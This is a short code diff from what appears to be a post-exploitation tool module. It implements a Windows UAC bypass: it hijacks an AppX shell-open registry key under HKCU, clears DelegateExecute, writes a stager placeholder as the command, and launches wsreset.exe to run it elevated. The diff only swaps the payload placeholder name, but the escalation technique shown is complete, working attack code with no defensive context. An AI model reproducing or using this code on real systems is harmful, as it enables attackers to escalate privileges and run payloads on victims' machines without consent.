@@ -29,7 +29,7 @@ try
     var path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command";
     var delegate = proton.registry.read(proton.registry.HKCU, path, 'DelegateExecute', proton.registry.STRING).SValue;
     proton.registry.write(proton.registry.HKCU, path, 'DelegateExecute', '', proton.registry.STRING);
-    proton.registry.write(proton.registry.HKCU, path, '', '~PAYLOAD_DATA~', proton.registry.STRING);
+    proton.registry.write(proton.registry.HKCU, path, '', '~STAGER_DATA~', proton.registry.STRING);
 
     proton.shell.run("C:\\Windows\\System32\\wsreset.exe", false);
 
